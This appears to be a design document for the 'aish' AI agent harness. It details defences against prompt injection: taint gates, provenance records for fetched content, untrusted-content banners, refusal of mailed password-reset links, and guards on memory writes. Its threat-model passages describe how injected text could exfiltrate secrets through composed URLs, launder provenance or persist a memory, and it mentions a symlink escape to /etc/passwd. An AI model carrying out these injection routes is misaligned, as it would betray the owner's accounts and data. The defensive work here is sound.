- **Two directories are covered by a RECORDED fact, one by the absent-record fallback.** `transcripts/` is recorded in `recordings.load_transcript`, unconditionally and with no parameter, because there is nothing to decide — a caption track is fetched over the network and written by whoever uploaded the recording. `documents/` is recorded twice: `_resolve_pdf` records the fetched PDF it saves, and `documents.convert` records the rendition from an `ArtefactSource` the agent hands it. **`browser/downloads/` has no write site at all** and is covered entirely by the fallback, which is the point of the fallback rather than a gap in it — see the next bullet.
- **Absent record = outside content**, #314's `UNKNOWN_CONTINUATION` rule under a different name. Membership in `_outside_populated_stores()` is what turns "no record" into "outside", so the three directories are protected the moment the path is in the list; a write site added later makes an attribution SPECIFIC and is not what makes it safe. It covers artefacts written before this shipped, records that did not survive, and corrupt ones. It also makes DELETING a record harmless by construction — the bytes become less trusted, never more — which is why only the write side needs a door.
- **The marking happens at READ time and is never written into the file.** A rendition addresses itself: `[page N of T]`, `[h:mm:ss]`, and the line numbers `files.read_file` prints. `read_pdf` and `read_media` have already promised those offsets to the model, and a banner written into the bytes would move every one of them — a rendition whose content shifts because of a safety marker is a bug generator, and it would not cover a rendition already on disk. `_marked_outside_read` puts an `[aish: …]` attribution line and then `web.UNTRUSTED_NOTE` in front of the RESULT. An `ERROR` result is left alone: "no such file" is aish's own sentence and bannering it would attribute aish's words to a source (#313).
- **Marking a local read must not start EXCUSING links, and does not.** `_note_offered_links` partitions on that banner, so bannering a `read_file` result would have written every address in a caption track into `_offered_links` — a set that exists solely to excuse, and therefore the one direction this may never move. `read_file` passes `offers=False` at both doors (`_commit_provenance` and the trim-door `ContinuationSource`): a file offers nothing, which is exactly what a bannerless local read recorded before. Stricter-or-equal, both ways round.
- **Local and fetched differ, and the distinction is not re-derived.** `_pdf_origin` asks `_brings_outside_content("read_pdf", …)`, the same `DUAL_SOURCE_TOOLS` rule that already decides whether `read_pdf` raises taint — a PDF the owner had on disk is his, the same PDF fetched from a URL is not. It ORs in `_reads_outside_content(path)` as a laundering guard: a fetched PDF is saved INTO the document store, so the model can name it back by its local path, and without the second half that second read would relabel the rendition as this machine's own. `provenance.record_artefact` refuses to relax an existing record for the same reason, one layer down.
- **The write side is the sharper half, refused rather than carded.** A model able to write a record can mark a fetched PDF as this machine's own and take the fence down for exactly the bytes it went up for — #317's laundering, one store over. `_is_artefact_record` requires BOTH the suffix and membership in one of the stores, so a `parser.src` in the owner's own project is untouched, and `_dispatch_write` refuses before it plans (planning an edit reads the file). Refused, not carded, for #317's reason: the card would show a digest-named file under a state directory.
- **The record is part of its artefact and never an entry of its own.** `documents.prune` and `recordings.prune_transcripts` both skip records when counting and unlink them with the bytes they describe. Counting them would halve each store's capacity; evicting one alone would leave bytes on disk that nothing attributes, which is this issue again.
- **One residual, named.** A `read_file` result that is TRIMMED and later paged back with `read_tool_output` carries `untrusted=False`, because the trim door has only the tool NAME and not the path (`_brings_outside_content(name, None)`). The conservative alternative — every paged-back local file read raising taint — over-restricts the overwhelmingly common case to cover a rare one, and the marking itself survives in the cached bytes, since the trim caches the message as the model held it.

**Evidence frames: the same class, one door over, and the door was already open (#318).** #318 first verdicted the media store as NOT the same hole — the cache leaks because it holds text and text read back is context, while a frame holds pixels — and left a standing condition: *if a path is ever added that lets the model put a local image into its own context, evidence frames must be excluded from it or carry provenance.* It asked whether that could be a test rather than a comment, since it asserts a negative about a path that does not exist yet. **The path already existed**, and the paragraph below is what found it.

**It can, because the seam is enumerable — and enumerating it showed the condition had already fired.** A picture reaches a provider request by exactly one route with two countable ends: what hangs an `images` key on a conversation message (`run_task`, the owner's attachment; `_deliver_tool_media`, a tool's own pictures, #215), and which tools may declare a picture on their result envelope (`_show_image`, `_read_media`, `_read_pdf`). #318 had read `show_image` as handing the model back only a markdown line; since #215 it also ATTACHES the bytes, and `_read_local_image` accepted any path inside `workspace_roots` — which the media store is, deliberately, because that boundary is what let a frame be displayed at all. So the model could name a frame a driven page left behind and put it in its own context, bannerless, unattributed and untainted (a local path is not outside content under `_brings_outside_content`), and the store outlives the task, so a page driven in one chat was reachable from the next.

**The fix is the store's address, exactly as it was for the cache.** Frames moved to `browser.frames_dir()` = `state_dir/frames`, outside every workspace root, with caps of their own; the boundary grew no exception, the file layer learned no second provenance path, and `Agent._is_evidence_frame` asks `files.contains` about the store directly on the read path, the write path, and the parallel-read predicate — because a session root containing the state directory would otherwise put the store back inside the boundary. Read and write are refused rather than carded, for the cache's reason plus one of its own: a model that can write here can overwrite the picture of the page it drove, which is #295 P6 from the other side. The display it existed for is unaffected — `/frame` is an authorised endpoint for exactly these bytes (`docs/web-server.md`), because what changed is what the MODEL may read and never what the owner may see. `docs/browser.md` carries the argument and the measured caps.

**`show_image`'s own store stays inside the boundary**, and the difference is the whole rule: a picture the model ASKED for is one it may read back; a picture written unprompted, from outside content, is not. What `TestWhatCanBecomeModelVisibleImageContent` does is make a THIRD channel impossible to add quietly and pin the two ends in both directions; its tripwire, added by #317 asserting the broken fact so that closing #318 would fail a test, now asserts the fixed property instead — the property needed a test, and a test deleted on the way past is a property that stops being checked.

**The enumeration channel above is ACCEPTED, in writing, and deliberately not closed (#294).** It is low-bandwidth, it requires model compliance, and the model must have read the secret first. Closing it means re-gating plain reads — the usability trade the taint narrowing forbids in its own words — and **no per-read budget is acceptable either: a budget is an approval card by another name.** It is made VISIBLE instead, by the record of where a tainted turn's reads went, rather than fenced. Anyone reopening this should reopen the decision, not reach for a counter.

**Owner provenance is now recorded in every session.** `note_owner_hosts` used to skip `origin == "user"` because the gate returned before consulting it. Left that way, the fence would have made every host the owner typed himself come back novel — the single change most likely to be felt as breakage.

**Taint reaches the knowledge gate too, and that is where an injection becomes PERMANENT.** A memory is retrieved into every future session, so a fact written while the model was echoing a page outlives the page, the task and the session. An attended turn that has read the open web therefore holds a save on a card — one of the few places a card is still worth spending, because it is rare and checkable at a glance. Deletion **holds** there rather than being refused outright, unlike the triggered case: attended, *"forget that"* is a thing the owner legitimately says.

`TestTheFenceGoesUpWhenSomethingIsRead` pins all of it, including the two that would be felt immediately if they broke: an attended turn that has read nothing is byte-identical to before, and ordinary research stays card-free after the fence is up.

**A link that arrived by MAIL is a sharper case than taint, and gets its own answer (#279).** The fence above asks one yes/no question about the whole task. Mail needs more, because a link is not merely untrusted content — it is the delivery mechanism for every account-recovery flow there is. aish following one by itself hands an injected turn the password-reset button for anything the owner owns, and this matters more than it sounds: aish reads HIS mailbox, not only its own.

`provenance.py` holds the classification; `Agent._mail_link_gate` enforces it. Two tiers, and only one is a judgement:

- **Structural.** A URL that arrived in mail is never opened by aish alone. No classifier, nothing to evade by wording. The gate covers `EGRESS_TOOLS | BROWSE_TOOLS` — **wider than the egress gate on purpose**, because a link is dangerous here for *acting*, not for carrying data outward, so `browse` and `read_pdf` count.
- **Judged, and it may only RESTRICT.** A message that reads like a sign-in, password-reset or activation mail has its links refused **outright** rather than carded. *"Open the sign-in link"* is precisely the card a tired owner taps, and there is no yes that makes following one safe. Under #198's law a scored verdict may restrict and never license, which is the direction this runs: a false positive costs one link he opens himself.

**The owner's argument for the heuristic, which beat mine.** I objected that a classifier loses because the attacker writes the text. That is false in the case that matters: there, the attacker triggers a **genuine** reset at a **real** service, so the mail is written by that service and is heavily stereotyped — *"most email logins are super super similar"*. The attacker-authored fake is the case a classifier loses AND the case that is useless to an attacker, because a fake link resets nothing.

**A link inherits its verdict from the message it sat in, never from its own spelling** — a reset link is routinely a bare tracking redirect with nothing readable in its path, and the words around it are what give it away. And the classification is **per message, not per result**: a mail search returns many hits in one blob, so `messages_in` splits the JSON array the mail tools return, and one reset mail among ten does not refuse everybody's links.

**Which tool output is mail is DECLARED, not inferred.** `content_from: email` in `TOOL.md`, parsed like `mutating` and on the same reasoning: the harness cannot tell a mail reader from a weather reader by its name, and guessing in either direction is worse than being told. The owner's two mail tools carry it, in his config tree rather than in this repo.

**The card here is the exception that proves the standing rule, not a retreat from it.** An ordinary mailed link is offered on a card because this is exactly where a card still earns its place — rare (a handful in a task, never one per action) and checkable at a glance (one address, one message). The grant is per LINK and never per host: approving one tracking link must not approve the next from the same sender. Unattended it fails closed. `TestALinkThatArrivedByMail`.

**Provenance is CAPTURED per call and COMMITTED per turn, and the split is the whole repair (#311).** All three records above — `_tainted`, `_offered_links`, `_mail_links` — were written from `_execute_tool_calls`, which is the native loop's function and nothing else's. The claude-max SDK owns its own loop and routes tool calls straight into `_call_result` via `_locked_dispatch`, so on that backend none of them were ever written. The offered-link half failed safe (a link nobody wrote down is simply not excused, so the call gates). **The taint half did not: the task looked untainted for its entire life no matter what it read**, so an attended claude-max session could read a hostile page and then compose an address at any host, and `_egress_novel_hosts` returned on its first line, forever. `_mail_links` did not fail safe either, and it is the sharper of the two: an emailed link on claude-max was not recognised as having arrived by mail, so neither the structural "aish never opens one alone" rule nor the outright refusal of a sign-in link ever fired — on the backend, and the mailbox, the owner actually uses.

The fix is not an explicit call in `claude_max.py`. That repairs today's backend and leaves the next one to rediscover the bug, which is the general shape worth naming: **a second backend that reuses the execution point but not the bookkeeping around it re-opens whichever fence is built on that bookkeeping.** So the recording moved to a seam neither backend can skip — but it could not simply move wholesale, because the two halves want different places:

- **Capture** belongs in `_call_result`. That is the one funnel EVERY tool call passes through — the native sequential path, the native parallel read-only path, and `_locked_dispatch` — precisely because it already exists to give both backends the same trace steps. `_capture_provenance` appends `(name, args, result)` and applies nothing. It takes a `threading.Lock`, since `_call_result` runs on the SDK's worker threads under claude-max (the same fact that makes `_call_ids` a `threading.local`), and the parallel path adds a second reason to state the rule even though it collects on the main thread.
- **Commit** belongs at the turn boundary, in `note_intent`. Applying per call would have been the obvious move and it is wrong: `_note_taint`'s timing is a decision, not an accident. A call must not meet a gate raised by the call **beside it in the same batch** — two ordinary reads issued in one breath would start drawing a card on the second — and the reasoning that makes post-batch safe is unchanged, since composing an exfiltration URL requires having READ the thing first, so the content came back on an earlier model call and the flag is up before the model that saw it speaks.

**The parallel read-only fan-out keeps a commit of its own, and that is not an exception to the rule.** The calls that could not join the fan-out — the ones that prompt, or that write — are dispatched after it, so it is a genuine sub-batch boundary in the same sense `note_intent` is, and what the reads brought in must be in force before those calls run. It already was, and losing it would have been the one way this change could make anything *more* permissive: two reads fanning out and a `remember` behind them would have stopped drawing a card. Two commit points are safe because commit DRAINS — a second one has nothing left to apply, so no record can land twice, which is the property that lets a boundary be added without auditing the others. `test_the_parallel_fan_out_is_a_sub_batch_and_commits_before_the_rest`.

One behaviour DID move, in the narrow direction, and it is worth writing down rather than discovering: the old call passed the whole `calls` list to `_note_taint` at that point, including the trailing calls that had **not run yet**, so a `browse` queued behind two reads tainted the batch before it happened. It no longer does — only calls that have actually returned are captured. That is the documented rule being enforced instead of violated (a call must not be gated on something that has not occurred), it needs a turn holding two reads, a gated read and a knowledge write at once to be observable at all, and the fan-out's own taint still reaches everything behind it.

**`note_intent` is the seam because both loops already call it on every model response, before dispatching that response's tool calls** — the native loop right after `_chat_turn`, claude-max on every acting `AssistantMessage`. That is exactly "the last batch is over and the next has not begun", which is what the commit needs and what no per-call site can express. It carries a second property worth having: a backend that skips it also loses the approval card's intent (#252), so the omission is *visible* rather than silent — which is the failure mode this whole issue was.

Two things a reader should not have to re-derive. The claude-max commit is genuinely per batch, not per call: the SDK does not produce the next assistant message until it has every tool result from the previous one, so by the time `note_intent` runs for message N+1 the handlers for message N have all returned. And capture sits in a `finally`, so a tool that raised is still recorded — a `read_url` that crashed mid-fetch had already reached out, and dropping its taint because it failed would be the one direction this must never move. The conformance test drives BOTH loops over the same tool calls and asserts the same three records come out; it is the thing that would have caught this, and the reason it is written as a cross-backend test rather than a claude-max test is that a third backend gets it for free. `TestProvenanceIsCapturedPerCallAndCommittedPerTurn`, `TestProvenanceConformance`.

**Knowledge writes (#196).** The capability the axis was never applied to: `remember`/`forget_memory` auto-approve, deliberately, so capturing a fact costs nothing — but that reasoning is attended-only. Unattended, the text proposing the write can be injected email while the result persists into EVERY future session and is retrieved by preflight: a **persistence primitive reachable from untrusted input**, strictly worse than the read exposure P0-2 closed, because it outlives the session. `_knowledge_gate` runs immediately before both branches (neither is in `READ_ONLY_TOOLS`, so the parallel path can never reach them) and returns on its first line for `origin == "user"`. Non-`user`: **deletion is refused structurally**, with no card, because there is no unattended case where autonomously deleting the owner's knowledge is right, so asking would only park a worker on a question already decided — and a policy that exists only as prompt text is not a policy. **Saving holds** on the card, because a triggered session does legitimately learn things and the owner should see what lands in the corpus. Every refusal names the slug and the real destination, so the harness carries the feedback instead of the owner. `_triggered_safe` must never shortcut `remember`. `TestKnowledgeGate`.

## Tool modules

### `tools.py`
`run_command` (approval-gated shell) and `read_docs` — auto-approved, so it takes only a bare command name validated against PATH, never a shell string (`TestRunCommand`, `TestReadDocs`, `TestReadDocsTopic`, `TestStreamingAndCwd`, `TestBinaryOutput`, `TestTruncate`).

**The result envelope (#192, L7).** `ToolOutcome` + `classify_output`. It exists because the runtime used to decide whether a call succeeded by sniffing a string prefix, which recorded a tool returning an empty transcript, a populated `error_log` and **exit 0** as a green ✓ while the model silently substituted six web searches for the source the user had named. `ToolOutcome` is deliberately a **`str` subclass**: every existing caller keeps treating it as the result text, so the verdict rides along with no ripple through ~30 dispatch branches — and, the load-bearing half, the metadata travels WITH the value rather than in instance state, which is what makes it correct on the parallel read path where several calls are in flight (`_run_meta` could not have been used there). The caveat follows from the same choice: a string operation returns a plain `str` and silently drops the envelope, so a `ToolOutcome` is always built LAST, after any concatenation. `classify_output` is the deterministic verdict — exit code, then emptiness, then declared required fields, then a populated error channel (`error`/`error_log`/`errors`: a NAMED field the wrapper author chose, never prose). `read_tool_output` pages a truncated result from the cache, so truncation is no longer a dead end and the wrapper never re-runs. `TestEnvelopeEndToEnd`.

**A refused action is never a green step.** One rule applied last in `_emit_tool_step`: a `decision` in `REFUSED_DECISIONS` forces `ok: false`, `status: "failed"`, `verdict_by: "gate"`, whichever path set it. Wider than the contract's own table — `run_command` sets `decision` but never `ok`, and `DENIED_RESULT`/`HELD_FOR_ADJUSTMENT`/`BLOCKED_RESULT` start with none of the sniffed prefixes, so a denied *shell command* logged green too: ten sites, one defect. `TestRefusalsAreNotLoggedGreen`, `TestRunCommandRefusalsAreRedToo`.

### `files.py`
`plan_*` computes, `commit()` writes, and the gap between them is the review (L5). `read_file` prompts on sensitive paths. `edit_file` has two rescue layers for the failure loop small models hit — pasting `read_file`'s numbered output, and slightly-off indentation. `TestReadFile`, `TestPlanWrite`, `TestPlanEdit`, `TestEditRescue`, `TestFileTools`.

**One path-containment function, and a lint that keeps it one (#309).** "Is this path inside that one?" is asked everywhere — by the approval gate on a shell operand, by `read_file`, by the scratch workspace, by `/file`, `/pdf` and `/download`, by the PDF export inlining a local image, by the terminal renderer, by a rule's `path_under`, by a plugin manifest naming its own wrapper. It was answered separately in each of them, and the answers did not agree. `files.is_outside_roots` resolved symlinks; `approval._token_escape` did not, so a symlink INSIDE a session root pointing at `/etc/passwd` auto-approved `cat notes.txt` (#178 P1-1) while `read_file` on the same path prompted. Four correct implementations and a wrong one is the predictable outcome of five, and the wrong one is never the one being read.

`contains(root, candidate, cwd)` is now the only one. It resolves **both sides** — `~` expanded, a relative candidate anchored to `cwd`, `..` and every symlink defused — which is what makes a link inside the root pointing out of it an escape (the asymmetry that was the bug) *and* a root reached through a symlink still match the file under it (`/tmp` vs `/private/tmp` on macOS: resolving only the candidate would call every file under the alias an escape). `within_roots` is the plural — inside ANY root is inside, and **no roots means nothing is inside**, which is the fail-closed reading `is_outside_roots` has always had. `resolved()` underneath is the single resolver, returning `None` rather than raising so every caller's fail-closed branch is the same branch; it catches `ValueError` as well as `OSError`, because a path holding a NUL byte raises that one and used to propagate straight out of `is_auto_approvable` — the gate did not approve, it fell over.

**The scratch workspace's stricter question is a PARAMETER, not a second function.** `path_within` needs *strictly below* the scratch dir (writing the directory itself is not the same permission as writing a file in it), so `contains(..., strict=True)` says that — the same shape as the size cap being an argument to the one guarded fetch (#308).

**What is deliberately NOT folded in is the decision about WHICH tokens to resolve.** `approval._token_escape` still skips a relative token with no `..` that names nothing on disk: a grep pattern is not a path, and resolving every command word against `cwd` would make every search prompt. That is a judgement about the token, and it stays in the parser; only the resolution and the containment moved.

Every rerouted site keeps or tightens its verdict — the only acceptable direction for a change to `approval.py` (L3). `TestConsolidationOnlyEverTightens` pins that directly, one command per property, and `TestSymlinkEscapes` / `TestScratchWorkspace` / `TestRootScoping` still hold from the other side. `TestContains`, `TestWithinRoots`.

The lint is the half that closes the class rather than the instance. `TestOnePathContainment` sweeps `aish/**/*.py` for the containment idioms *by the way they are actually written* — `is_relative_to`, `relative_to` inside a `try/except ValueError` (the older spelling, which reads as parsing rather than as a check and is how it survived five rewrites), `commonpath`, and `x in y.parents` — with `files.py` the only exemption. `test_the_sweep_actually_catches_one` plants all four in a temp file, because a guard that cannot fail is decoration.

**The same finding, one layer up: five copies of the session-name check (#178 §11).** `resume`, `delete`, `rename`, `/export/session` and the offline mirror each turned a chat name straight off the wire into a path in the state directory, and each wrote out `startswith("session-")`, `endswith(".jsonl")`, `"/" not in name` and `".." in name` for itself. `server.safe_session_path` is the one answer, and its containment goes through `files.contains` like every other one — so a log that is a symlink out of the state directory is now refused rather than followed. **Existence stays at the call site**, because the callers disagree about it on purpose: a rename or a delete may name a chat that is open but has not written its log yet. `TestOneSessionPathCheck`.

### `web.py`
`web_search`/`read_url` are auto-approved but their inputs leave the machine, so every call is echoed and fetched content is wrapped in an untrusted-content banner. http/https only.

**Search results are marked (#305).** `read_url` wrapped its page in the untrusted-content banner from the beginning; `web_search` returned titles and snippets with **no marking of any kind**, verified in #198's evidence pass. That is the same threat one layer down and arguably a worse one: a snippet is page-authored text that arrives *unasked*, and which pages appear at all is decided by an index anyone can push on with ordinary SEO, so a search is an injection surface as much as a fetch is. `SEARCH_RESULTS_NOTE` is `UNTRUSTED_NOTE` plus one sentence naming which words below are the stranger's, with a concrete example, in the imperative — capability phrasing is measurably ignored by the models that run here. It is composed from the existing constant rather than written afresh: **two spellings of "this came from outside" is how one of them stops being read.** It is applied inside `_numbered`, the one function that renders a row, so a third rendering path cannot forget it; the aish-voice header (`BOTH_INDEXES`/`ONE_INDEX`) stays ABOVE the banner, matching what the system prompt tells the model a `[aish:` line means, and a `NO_RESULTS` answer gets no banner because nothing outside wrote it.

**A row is a TITLE, an ADDRESS and the index's own summary line — and for two days it was not (#305, then the search-arm experiment, then its reversal).** `_numbered` renders three lines, and `web.serp_results` / `web._first_index` collect the summary text the index prints under each result. The same function caps the title at `RESULT_TITLE_CHARS` (120) and the summary at `RESULT_SUMMARY_CHARS` (300), flattens control characters (`_flat`), and breaks a leading `[aish:` into `(aish:` (`_not_aishs_voice`) so neither field can arrive wearing aish's own voice; the ADDRESS is deliberately uncapped, because a truncated URL is unopenable. **The two-day detour is worth knowing about**, because both halves of it matter. On 2026-08-28 the summary line stopped being collected at all, on the grounds that it was safer and cheaper. It was neither: a snippet is a SUBSET of the page, so opening the page delivers everything the snippet said and more — what removal actually bought was that a *figure* could not reach an answer unless a page carrying it was opened, which is staleness and not injection — and paired over 14 runs it cost a median **+34 840 prompt tokens** to save a median 9.4s, because the model opened a median 1.5 more pages per task with nothing to judge by. Directional at n=14, but there is no token saving to be had, which is what it was defended with. `docs/roles.md`, *Title and address only*, is the full record. **What the detour got right and what survived it:** those three defences used to live in `agent.py` and ran only on the path where an isolated reader had answered — not on a fresh install, not on claude-max, not when the key was down. They live at the render now and hold on **every** search, and they apply to the restored summary line on the same terms as to the title. The stale-figure problem is real and this revert does not solve it: the banner asks the model to source a figure from a page it read, and asking is not enforcing (#340).

**What this does NOT do, said plainly.** A banner is **guidance, not a control**. Nothing here prevents a model from following an instruction in a *title*; it only makes the provenance legible, and every argument for it is an argument about likelihood. The owner's framing is the specification of the real fix: *"marking something as untrusted, it's a guidance, right? … decoupling things is: don't provide more context — separate this into independent calls, not keep one context in one place."* The snippet half of that is answered by removal rather than by a reader: the prose is not collected, so there is nothing left for a banner to be trusted about. **The title half is open, deliberately.** 120 stripped, capped characters still cross verbatim, and the per-row flag that would have noticed an instruction-shaped title went with the reader that produced it — the trade, the numbers behind it and the way back are in `docs/roles.md`, *The residual this accepts: the title channel*. `read_url`, `read_pdf`, driven pages and mail bodies are untouched by any of this: the banner remains the whole of what is on them, and #295's rollout order has not moved past its first surface.

**The taint fence already saw a search, and that is why it was left alone.** `web_search` is in `EGRESS_TOOLS` and therefore in `UNTRUSTED_SOURCE_TOOLS`, so `_note_taint` raises `_tainted` on a search exactly as it does on a fetch — a turn that has only searched is already treated as having read the outside. So the provenance gap was in the *text the model reads*, not in the gate; nothing about taint needed changing, and changing what taint means would have been a design decision riding on a banner. `TestWebSearch`, `TestTheFenceGoesUpWhenSomethingIsRead`.

**A page cut is no longer a one-way door.** `_present`/`_present_snapshot` hand the whole text to `web.Stash` — an injected callback the agent fills with `_stash_page`, so `web` still works with no agent behind it — and the notice carries the continuation key. The cut size travels on that key, because a page is cut at `PAGE_MAX_CHARS` and knows nothing about this backend's `output_caps`. Why it matters, and what the notice is allowed to claim about the half of a browse result it cannot see: `docs/browser.md`, *What a cut is allowed to claim*.

**A search that matched nothing is an ANSWER, and saying otherwise cost ten calls.** `ddgs` reports an empty result set by **raising**, not by returning `[]` — `raise DDGSException(err or "No results found.")` — so `web_search`'s `if not results` branch was unreachable and every empty search fell into the generic `except`, reaching the model as `ERROR: web search failed (No results found.) — retry once, or answer without the web`. It did what it was told: on 2026-08-21 one question ("open product roles at Google in Poland") spent **ten searches** re-wording the same query, each one "failing" identically, and because `ERROR` is what the envelope's prefix sniff scores a call on, the trace showed a working tool reporting itself broken to the user watching it. `found_nothing` separates the two outcomes the class carries — a dead engine is re-raised holding *that engine's* exception, an empty aggregate holds this one sentence — and the empty case returns `NO_RESULTS`: no `ERROR` prefix, no invitation to retry, and the one alternative offered is a different **action** (different keywords, or say the web has nothing) rather than a different phrasing of the same one. Matching on a library's prose is only safe while someone finds out it changed, so `test_ddgs_still_says_it_the_way_we_match_it` reads the installed `ddgs` source for the sentence; the failure direction is benign either way — a reworded library turns empty searches back into ERRORs, which is the old behaviour, and nothing in the match can turn a real error into a false "nothing found". The `site:` operator was the obvious suspect for those ten empties and is **not** the cause — it was measured against the live backend afterwards and returns results — so the wording claims nothing about *why* nothing matched. `TestWebSearch`.

**`read_url` returns the page's declared images, and that is a bug fix, not a feature.** The extractor read text nodes and `<title>` and dropped every attribute, so an article came back with its pictures stripped. A rule then required a picture, and the model — having no URL — **invented one**: a filename built from the headline onto the site's real URL pattern. It 404'd, and `show_image`'s advice (*"read_url the page again for a working one"*) pointed at the very reader that had removed them, so it guessed again. **Seven of eight `show_image` calls failed that way in one session**, and the tail of that run is the loop. The real URLs were present and returned 200 — one behind a hashed CDN path (`/t/GEiBu2iaA9GrrmRRMXVC3ULLfZo=/2500x/…`) no model could ever guess. `og:image`/`twitter:image` only, absolutised against the page (they are routinely site-relative), capped at `IMAGE_LINKS_MAX`, appended AFTER truncation because on a "show me" task they are the point of the read. The raw `<img>` list is deliberately not offered: 44 and 26 tags on the two real pages, both led by the site logo. The 404 message now names where a working URL comes from instead of sending the model in a circle. `TestPageImages`. `fetch_binary` is the same guarded fetch for non-text bodies, sharing `_require_public` and `_opener` so the redirect re-check applies. `TestWebSearch`, `TestReadUrl`, `TestHtmlToText`, `TestBlockedPageAdvice`, `TestSsrfGuard`, `TestWebTools`, `TestLive`.

**Two indexes, both every time, merged (#263).** `web_search` asks `ddgs` and — concurrently — reads `google.com/search` in the browser on a profile signed into nothing (`search_page`/`serp_results`; `docs/browser.md`, *The second identity*). Which engine was measured, not assumed: on 2026-08-21 Bing **ignored `site:` outright**, answering `site:careers.google.com "product management" Poland` with a dictionary definition of *product*, and DuckDuckGo's own page is the index that had already come back empty. Google answered.

**It shipped as a fallback — escalate when the first index came back empty or ignored the query's own `site:`/`filetype:` — and the owner's objection retired that in a day, correctly.** A trigger can only fire on a failure it can SEE, and the failure that matters here is invisible: five plausible results that rank a blog post above the official documentation look exactly like success to every check code can make. `unmet_constraint` catches only the constraints a query states OUT LOUD, which is a small slice of the ways a result set can be wrong, so quality cannot be something to reach for after noticing — the second index either runs or it does not help. It now survives only as an EXPLANATION on the degraded path, where a result set that ignores the query's own terms is worth much more to the model with that fact attached.

**What made "always" affordable is that the cost had been measured wrong.** The browser looked serial and it is not — `_Owner` is an event loop with tabs, so **four concurrent searches through Chrome finished in 3.16s, the same as one, against 15.01s run one after another**. The remaining honest cost is ~1-2s of wall clock per search against ddgs alone, and the owner's framing settles that: the turn that reads those results is far longer than the second saved, so context quality buys back more than latency costs. `BOTH_INDEXES` names both engines and the identity the browser one read with, and `_merge` dedupes on a normalised URL so one page cited by both is one result, browser-ranked first. A wall costs nothing: `is_challenge` catches `/sorry` so it is never served as results, `SEARCH_WALL_COOLDOWN` stands the browser index down for half an hour, and the answer degrades to exactly what it was before this existed — with `ONE_INDEX` saying so rather than going quiet. **A search read is judged by where it LANDED** (`landed_on_results`), not by the URL that was requested: aish builds the only URL there is and percent-encodes the model's query into it, so the model never proposes an address at all, and the landing check then catches every redirect — `/search` really does 302 to `consent.google.com`, `/sorry/` and `accounts.google.com/CheckCookie`. Anything off the results path is discarded UNREAD, text and links both, and arms the same cooldown, since whatever moved us will move us again. This is deliberately not a URL allowlist: an allowlist judges the address at the one moment it is guaranteed correct and says nothing about where Chrome ends up, which is the half that matters — and it is the fence that would make signing the search profile in a safe option rather than a trade. `TestWhereTheSearchLanded`. `_is_serp_chrome` drops the engine's own furniture by (host, path) and not by domain: the naive "drop google.com" filter throws away the answer, since every correct result of a `site:careers.google.com` query is a google.com subdomain — the first version of the probe did exactly that and scored a perfect page as zero results. `scripts/probe_search.py` is where the measurements come from (it launches Chrome, so it is outside the suite); `tests/fixtures/google_serp.json` is a real results page captured with it. `TestTheSecondIndex`.

**A page is empty when a PERSON would see nothing, which is not what `strip()` says.** The escalation to the browser hangs off one emptiness test, and it under-reported emptiness — the direction that costs the most, because a page with nothing in it is then served as if it had something and the renderer that could have read it never runs. `claude.ai/code` serves its JS shell with a body of exactly one **ZERO WIDTH SPACE**, and `'​'.isspace()` is False in Python, so `not text.strip()` judged that page non-empty. `read_url` handed the model 408 bytes of nothing **four times in one session** (2026-08-17), each read finishing in 0.15s because Chrome was never launched — while the owner was signed in to that page in that very browser and said so three times, the last time in capitals. The second-order failure is worse than the wasted reads: a fetch that "succeeds" never writes the host into `BROWSER_HOSTS`, so every retry took the same dead path and **asking harder could not reach the renderer**. `visible_text` drops the zero-width family, the word joiner, the BOM and the soft hyphen (a no-break space is deliberately absent — Python already calls it whitespace) and `is_blank` is the one test, used on both the fetch and the browser sides, so a rendered page of invisible characters is not laundered into content either. A character floor — *"under ~12 visible characters is a shell whatever it spells"* — was written alongside it to catch a spinner's `Loading` and **withdrawn**: it rejected `<p>hello</p>` as a shell, and a false empty verdict is not a free retry, it is sticky, writing the host into `BROWSER_HOSTS` and routing every LATER read of that host through Chrome first for the rest of the process. `browser.py` had reached the same conclusion from the other side, where a thin page gets a second chance rather than a rejection because a half-painted listing is short too. `TestWhatCountsAsEmpty`, `TestReadUrlEscalation`.

**The read is budgeted BODY FIRST, and a tile strip is compacted rather than dropped.** The old shape was a 6 000-char page cap plus a separate 6 000-char link note, and on a shop page it paid for the noise twice: a carousel of OTHER products — "Podobne oferty", fifteen tiles of price + title + link + delivery promise — is placed early *because the site wants it seen first*, so it filled the head, and then the same carousel's links filled the note. ~10.1k of context spent, and **the page's own price in neither**. Measured on the offer behind this: 6 672 characters dropped and the text was STILL tiles at the cut, so the description and buy box were never in the read at all; across 9 full reads of one offer page the buy box appeared in **none**. The model then quoted `49,49 zł` from a two-day-old `web_search` snippet — the real price was `63,19` — while the tiles' prices, a neighbour's and the same sling in YELLOW, sat there corroborating it. It also repeated the stale figure *after* having located the right one, which is why `live-price` (ordering: did a fetch happen) needs to become provenance (did THIS number come from THAT page); the extraction fix alone would not have saved that session. `PAGE_MAX_CHARS` is one budget the body draws on first, so these 10-13k pages arrive whole for less than the split one spent on fragments, and `link_note` becomes a fallback reached only when the body genuinely did not fit — the 101-offer listing it was aimed at, not a product page.

**Compacted, never dropped, and that distinction is the design.** Rejecting a tile strip needs a rule for when it is decoration and when it is the content, and there is no such rule: on a listing the tiles ARE the page, and on this very offer page the strip held *other sellers of this product* — the only useful thing on it once the offer had expired — and the variant selector, which is exactly what a black-vs-yellow shopper needs. A carousel of unrelated products and a list of other sellers are structurally identical, so a page-level keep/drop bit answers neither. Each tile is squashed onto ONE line carrying its price, title and URL (185 lines to 76 on the real page), which also labels the prices as belonging to *other linked products* — the confusion that produced the wrong numbers. Only the line repeated verbatim across the strip goes, never one carrying a digit (prices live there), and the strip label names what went, because a silent drop reads exactly like a page that never had it. It runs on the merged text rather than the DOM, which is what lets one implementation serve the fetch and browser paths. Classic readability was considered and rejected for this: it scores PROSE DENSITY to select one main block, so a buy box — short strings, high link density — scores as chrome and is dropped, keeping the bug in a different shape. `TestTileStrips`, fixture `tests/fixtures/allegro_offer.txt` (real text from the offer in the session that filed it).

**A page's own declaration is read, as a CROSS-CHECK and never as an authority.** schema.org in JSON-LD — the summary a site publishes for Google, carried by almost every commercial page because rich results require it. It is the only statement of what a page is ABOUT that is language-independent, layout-independent, and not inferred from where things sit on the page, which is exactly what the reader had been doing when an advert's price reached an answer. It lives in a `<script>`, so `inner_text` cannot see it and never could: the reader takes what a *person* sees, and this is the half written for machines. Measured live through aish's own browser on the offer behind this: `Offer / price 63.19 PLN / availability OutOfStock` — the correct price the model needed eight reads to find, and the fact that the offer was **dead**, which it never found at all and which no amount of reading the visible text would have said.

